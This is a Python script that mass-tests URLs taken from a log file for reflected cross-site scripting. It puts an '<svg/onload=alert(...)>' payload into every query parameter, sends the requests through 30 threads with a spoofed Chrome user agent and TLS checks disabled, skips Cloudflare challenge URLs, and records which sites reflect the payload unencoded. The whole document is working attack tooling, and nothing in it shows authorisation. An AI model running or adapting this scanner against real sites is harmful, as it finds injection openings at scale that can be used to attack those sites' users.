import collections
import json
import re
import sys
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

import requests
import urllib3

urllib3.disable_warnings()

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9"}
CANARY = "40931"
CHAL = re.compile(r"cType:\s*'managed'|Just a moment|__cf_chl_", re.I)


def payload(tok):
    return f'zq{tok}"><svg/onload=alert({CANARY})>'


def test(url):
    """Replace every param value with the payload; report RAW / ENC / blocked."""
    p = urlsplit(url)
    q = parse_qsl(p.query, keep_blank_values=True)
    if not q:
        return None
    tok = "".join(c for c in p.netloc if c.isalnum())[:6]
    pay = payload(tok)
    nq = [(k, pay) for k, _ in q]
    probe = urlunsplit((p.scheme, p.netloc, p.path, urlencode(nq), ""))
    try:
        r = requests.get(probe, timeout=12, verify=False, headers=UA,
                         allow_redirects=False)
    except Exception:
        return None
    body = r.text or ""
    raw = f"<svg/onload=alert({CANARY})" in body
    enc = bool(re.search(r"&lt;\s*svg|%3Csvg|&#60;", body, re.I))
    return {"url": url[:160], "status": r.status_code, "len": len(body),
            "challenge": bool(CHAL.search(body)),
            "raw": raw, "enc": enc, "tok": tok in body,
            "params": [k for k, _ in q][:4]}


def main():
    urls = json.load(open("/opt/watch/logs/indeed/param_urls.json"))
    # one URL per (host, path); skip cloudflare-token params
    seen, targets = set(), []
    for u in urls:
        p = urlsplit(u)
        if "__cf_chl" in p.query:
            continue
        k = (p.netloc, p.path)
        if k in seen:
            continue
        seen.add(k)
        targets.append(u)
    print(f"[*] {len(targets)} unique host+path targets", flush=True)

    res, hits = [], []
    with ThreadPoolExecutor(max_workers=30) as ex:
        for i, r in enumerate(ex.map(test, targets), 1):
            if not r:
                continue
            res.append(r)
            if r["raw"]:
                hits.append(r)
                print(f"!!! RAW {r['status']} {r['url']}", flush=True)
            if i % 2000 == 0:
                open_ = sum(1 for x in res if x["status"] == 200 and not x["challenge"])
                print(f"  [{i}/{len(targets)}] open={open_} raw={len(hits)}", flush=True)

    json.dump(res, open("/opt/watch/logs/indeed/full_matrix.json", "w"), indent=1)
    print("\nstatus mix:", dict(collections.Counter(r["status"] for r in res)))
    print("challenge pages:", sum(1 for r in res if r["challenge"]))
    print("RAW reflections:", len(hits))
    for h in hits[:30]:
        print("  ", h["url"], h["params"])


if __name__ == "__main__":
    main()
